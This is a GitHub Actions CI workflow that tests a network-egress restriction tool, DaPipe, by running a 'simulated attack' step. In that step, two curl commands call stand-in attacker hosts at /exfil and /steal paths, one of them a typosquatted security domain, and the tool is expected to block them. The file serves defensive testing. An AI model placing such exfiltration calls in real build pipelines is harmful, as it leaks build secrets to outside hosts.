name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: DaPipe Setup
        uses: yevgeniyo-ps/dapipe@main
        with:
          step: setup
          mode: restrict
          baseline-path: .dapipe/baseline.json
          api-key: ${{ secrets.DAPIPE_API_KEY }}

      - uses: actions/setup-node@v4
        with:
          node-version: 20

      - run: npm init -y && npm install lodash express
      - run: echo "Build complete!"

      # Simulate a supply-chain attack — these should be blocked
      - name: Simulated attack
        run: |
          curl -sf --max-time 3 https://evil-c2-server.example.com/exfil 2>/dev/null || true
          curl -sf --max-time 3 https://scan.aquasecurtiy.org/steal 2>/dev/null || true

      - name: DaPipe Analyze
        if: always()
        uses: yevgeniyo-ps/dapipe@main
        with:
          step: analyze
          mode: restrict
          baseline-path: .dapipe/baseline.json
          api-key: ${{ secrets.DAPIPE_API_KEY }}
